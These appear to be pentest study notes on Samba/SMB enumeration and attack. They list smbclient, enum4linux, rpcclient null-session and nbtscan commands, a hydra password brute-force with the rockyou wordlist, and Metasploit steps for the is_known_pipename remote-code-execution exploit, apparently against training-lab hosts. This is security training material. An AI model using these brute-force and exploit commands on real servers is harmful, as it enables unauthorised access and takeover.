#### SAMBA
-> PORT : 139/445

Plot : It usage USER/PASS Authentication in order to obtain access to the server , now we can do a Brute Force attack in order to gain access to the server.

###### Tools : 
1. `SMBClient` :
	-> `smbclient -L IP -U USERNAME` : get the shares name.
	-> `smbclient //IP/SHARE -U USERNAME` : get the particular share data.
	-> `get FILENAME` : get download a file

2. `SMBMap` :
	->  `smbmap -H IP -u USERNAME -p PASSWORD`

3. `enum4linux` : tool used to enumerate samba server. alt of `enum.exe` : for windows
	-> `enum4linux -a -u USER -p PASSWORD IP` : to get all information about the samba server
	-> `enum4linux -a IP` : in case , if don't have USER/PASS.
	-> `enum4linux -a -u admin -p password1 demo.ine.local`

4. `hydra` : to perform BF
	-> `hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  demo.ine.local smb`

5. `auxiliary/scanner/smb/pipe_auditor `
	-> MSF Module to file pipe 

###### version 3.0.20 :: vulnerable to command injection :: MSF module :: No auth need

#### Use null session for check Anonymous share available or not
```
smbclient -L <ip> -N
```
#### Take access of the anonymous share 
```
rpcclient -U "" -N <target>
```




### Find the NetBIOS computer name of samba server using nmblookup.
```
nmblookup -A <ip/domain>
```


Moving Forward we used nbtscan tool. NBTscan is a program for scanning IP networks for NetBIOS name information. It sends NetBIOS status query to each address in supplied range and lists received information in human-readable form. For each responded host it lists IP address, NetBIOS computer name, logged-in user name and MAC address (such as Ethernet).
```
┌──(stuxnet8㉿stuxnet8)-[~/Desktop/mylab]  
└─$ nbtscan 172.17.17.218  
Doing NBT name scan for addresses from 172.17.17.218  
  
IP address NetBIOS Name Server User MAC address  
------------------------------------------------------------------------------  
172.17.17.218 KANYIKA <server> <unknown> 08:00:27:91:d3:3e
```


----------------------------
##### Do Banner grabbing using `nc`
```
nc -nv <target_ip> 445
```

##### Check the version of the SAMBA
```
use auxiliary/scanner/smb/smb_version
set rhosts <target_ip>
run
```

##### Take access of the RCE
```
use exploit/samba/is_known_pipename
set rhosts <target_ip>
run
```


##### Exploitation SAMBA
[[SAMBA exploitation]]
